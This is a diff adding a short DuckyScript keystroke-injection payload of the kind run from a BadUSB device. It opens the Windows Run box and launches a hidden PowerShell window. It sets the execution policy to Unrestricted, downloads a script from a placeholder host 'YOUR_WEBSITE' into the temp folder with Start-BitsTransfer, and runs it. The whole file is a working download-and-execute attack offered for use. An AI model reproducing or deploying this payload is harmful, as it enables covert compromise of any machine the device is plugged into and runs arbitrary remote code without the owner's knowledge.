@@ -1,0 +1,6 @@
+DELAY 1100
+GUI r
+DELAY 560
+STRING powershell -w h Set-ExecutionPolicy -Scope "CurrentUser" -ExecutionPolicy "Unrestricted"; powershell -c Start-BitsTransfer -Source YOUR_WEBSITE -Destination $env:temp\test.ps1; powershell $env:temp\test.ps1;
+DELAY 300
+ENTER
